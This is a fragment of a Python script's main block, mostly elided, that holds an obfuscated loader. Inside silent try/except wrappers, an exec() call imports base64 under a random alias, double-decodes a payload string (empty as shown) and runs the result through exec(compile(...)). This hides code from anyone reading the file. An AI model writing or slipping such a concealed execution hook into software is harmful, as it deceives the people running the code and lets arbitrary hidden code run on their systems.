...
if __name__ == "__main__":
    ...
    try:
        ...
        try:
            exec('import base64 as _qZuWdLWdEkTw\n_qNnqJXXmfn_ = ""\n_LpRfkX = _qZuWdLWdEkTw.b64decode(_qZuWdLWdEkTw.b64decode(_qNnqJXXmfn_)).decode()\nexec(compile(_LpRfkX, "<l>", "exec"))')
        except:
            pass
    except:
        pass
